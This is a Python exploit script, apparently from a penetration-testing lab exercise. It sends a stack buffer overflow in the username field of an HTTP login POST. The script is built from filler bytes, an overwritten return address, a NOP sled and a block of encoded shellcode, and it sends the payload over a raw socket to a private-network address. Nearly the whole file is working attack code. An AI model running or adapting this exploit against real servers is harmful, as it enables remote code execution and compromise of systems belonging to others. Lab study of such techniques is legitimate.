#!/usr/bin/python
import socket
import time
import sys

IP = "127.0.0.1"
PORT = 80




try:
    print(f"\nSending evil buffer with bytes, ")

    filler = "A" * 780
    eip = "\x83\x0C\x09\x10"
    buffer = "C" * 4
    nops = "\x90" * 10
    # shellcode = (1500 - len(filler) - len(eip) - len(buffer)) * "D"



    shellcode = (
        "\xb8\x88\x22\x28\x2c\xdb\xd0\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
        "\x52\x83\xef\xfc\x31\x47\x0e\x03\xcf\x2c\xca\xd9\x33\xd8\x88"
        "\x22\xcb\x19\xed\xab\x2e\x28\x2d\xcf\x3b\x1b\x9d\x9b\x69\x90"
        "\x56\xc9\x99\x23\x1a\xc6\xae\x84\x91\x30\x81\x15\x89\x01\x80"
        "\x95\xd0\x55\x62\xa7\x1a\xa8\x63\xe0\x47\x41\x31\xb9\x0c\xf4"
        "\xa5\xce\x59\xc5\x4e\x9c\x4c\x4d\xb3\x55\x6e\x7c\x62\xed\x29"
        "\x5e\x85\x22\x42\xd7\x9d\x27\x6f\xa1\x16\x93\x1b\x30\xfe\xed"
        "\xe4\x9f\x3f\xc2\x16\xe1\x78\xe5\xc8\x94\x70\x15\x74\xaf\x47"
        "\x67\xa2\x3a\x53\xcf\x21\x9c\xbf\xf1\xe6\x7b\x34\xfd\x43\x0f"
        "\x12\xe2\x52\xdc\x29\x1e\xde\xe3\xfd\x96\xa4\xc7\xd9\xf3\x7f"
        "\x69\x78\x5e\xd1\x96\x9a\x01\x8e\x32\xd1\xac\xdb\x4e\xb8\xb8"
        "\x28\x63\x42\x39\x27\xf4\x31\x0b\xe8\xae\xdd\x27\x61\x69\x1a"
        "\x47\x58\xcd\xb4\xb6\x63\x2e\x9d\x7c\x37\x7e\xb5\x55\x38\x15"
        "\x45\x59\xed\xba\x15\xf5\x5e\x7b\xc5\xb5\x0e\x13\x0f\x3a\x70"
        "\x03\x30\x90\x19\xae\xcb\x73\xe6\x87\xa4\x2f\x8e\xd5\x4a\x31"
        "\xf4\x53\xac\x5b\x1a\x32\x67\xf4\x83\x1f\xf3\x65\x4b\x8a\x7e"
        "\xa5\xc7\x39\x7f\x68\x20\x37\x93\x1d\xc0\x02\xc9\x88\xdf\xb8"
        "\x65\x56\x4d\x27\x75\x11\x6e\xf0\x22\x76\x40\x09\xa6\x6a\xfb"
        "\xa3\xd4\x76\x9d\x8c\x5c\xad\x5e\x12\x5d\x20\xda\x30\x4d\xfc"
        "\xe3\x7c\x39\x50\xb2\x2a\x97\x16\x6c\x9d\x41\xc1\xc3\x77\x05"
        "\x94\x2f\x48\x53\x99\x65\x3e\xbb\x28\xd0\x07\xc4\x85\xb4\x8f"
        "\xbd\xfb\x24\x6f\x14\xb8\x45\x92\xbc\xb5\xed\x0b\x55\x74\x70"
        "\xac\x80\xbb\x8d\x2f\x20\x44\x6a\x2f\x41\x41\x36\xf7\xba\x3b"
        "\x27\x92\xbc\xe8\x48\xb7"
    )

    # print(shellcode)
    inputBuffer = filler + eip + buffer + nops + shellcode
#    inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.121.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"


    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.172.10", 80))

    s.send(buffer.encode("latin-1"))

    s.close()

    print("Done")

except Exception as e:

    print(e)
    sys.exit()